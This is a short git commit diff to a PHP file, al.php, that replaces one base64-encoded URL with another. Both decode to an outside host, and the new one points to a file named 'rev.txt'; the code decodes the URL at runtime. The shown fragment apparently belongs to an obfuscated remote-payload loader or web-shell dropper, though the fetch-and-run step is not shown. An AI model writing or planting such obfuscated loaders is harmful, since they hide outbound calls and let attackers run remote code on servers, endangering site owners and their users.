2ed88812148b6201ad8d426c0ceeb33e31aeac03
luxeus_arch <74091721+ardifx01@users.noreply.github.com>
2025-07-10 18:48:05 +0700

    Update al.php

--- al.php
+++ al.php
@@ -8,7 +8,7 @@ function decode_file($data) {
 }
 
 
-$encoded_url = "aHR0cHM6Ly8weDE5OTkudGVjaC8xLzEudHh0=";
+$encoded_url = "aHR0cHM6Ly9maWxlLjB4MTk5OS50ZWNoL3Jldi50eHQ=";
 
 
 $decoded_url = decode_file($encoded_url);
